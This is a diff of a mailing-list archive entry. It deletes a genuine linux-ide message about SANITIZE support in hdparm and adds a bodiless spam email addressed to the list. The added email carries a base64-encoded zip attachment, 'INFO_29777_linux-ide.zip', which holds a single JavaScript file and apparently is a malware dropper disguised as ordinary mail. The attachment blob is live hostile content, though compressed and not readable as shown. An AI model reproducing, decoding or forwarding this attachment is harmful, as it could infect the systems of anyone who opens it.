@@ -1,37 +1,112 @@
-From: Mark Lord <kernel@start.ca>
-Subject: Re: [RFC] libata-scsi: introducing SANITIZE translation
-Date: Wed, 26 Oct 2016 18:44:47 -0400
-Message-ID: <a38e505d-bb78-ac7c-d289-0460eef9449a@start.ca>
-References: <577e843e.0a86620a.59167.ffffb899@mx.google.com>
- <1467910054.2322.7.camel@HansenPartnership.com>
- <CAGnHSE=8HEZ8AnDGjdOAhaA8f117GdbZZNhbQQOCYYM1b-8PvQ@mail.gmail.com>
- <1467998971.2343.10.camel@HansenPartnership.com>
- <CAGnHSEkLer=GRZxoc=AmS7J_oe945hSdUV2TisSuvfXdCPQ2Ow@mail.gmail.com>
- <1468025398.2390.24.camel@HansenPartnership.com>
- <CAGnHSEms1rwy7-+URRMrdggpk=_7YVijHwf1h93iBKW7zLxh8g@mail.gmail.com>
+From: <lucia.germino@unibas.it>
+Subject: 2706805393 linux-ide
+Date: Thu, 27 Oct 2016 02:55:35 -0000
+Message-ID: <147753693522.13761.6236623958303506396@charter.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-scsi-owner@vger.kernel.org>
-In-Reply-To: <CAGnHSEms1rwy7-+URRMrdggpk=_7YVijHwf1h93iBKW7zLxh8g@mail.gmail.com>
-Sender: linux-scsi-owner@vger.kernel.org
-To: Tom Yan <tom.ty89@gmail.com>, James Bottomley <James.Bottomley@hansenpartnership.com>
-Cc: Tejun Heo <tj@kernel.org>, martin.petersen@oracle.com, dgilbert@interlog.com, linux-ide@vger.kernel.org, linux-scsi@vger.kernel.org
+Content-Type: application/zip; name="INFO_29777_linux-ide.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-ide-owner@vger.kernel.org>
+Received: from 24-176-193-150.static.mtpk.ca.charter.com ([24.176.193.150]:53715
+        "HELO charter.com" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S932332AbcJ0Czl (ORCPT
+        <rfc822;linux-ide@vger.kernel.org>); Wed, 26 Oct 2016 22:55:41 -0400
+Content-Disposition: attachment
+Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
+To: linux-ide@vger.kernel.org
 
-On 16-07-11 02:35 AM, Tom Yan wrote:
-> I don't suppose there would be any problem doing it in userspace /
-> with ATA PASS-THROUGH anyway.
-..
->>> On 8 July 2016 at 17:29, James Bottomley
->>> <James.Bottomley@hansenpartnership.com> wrote:
-..
->> Not really.  The point is that you've proposed something as an addition
->> to the kernel that can also be done in userspace.  Checking if it can
->> work easily there is like a barrier to entry.  If it works, then fine,
->> we're done.  If it throws up problems then we reconsider the kernel
->> route.
-
-hdparm has full support for the SANITIZE commands in userspace.
-
--ml
+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
+AIkUAAAAAA==
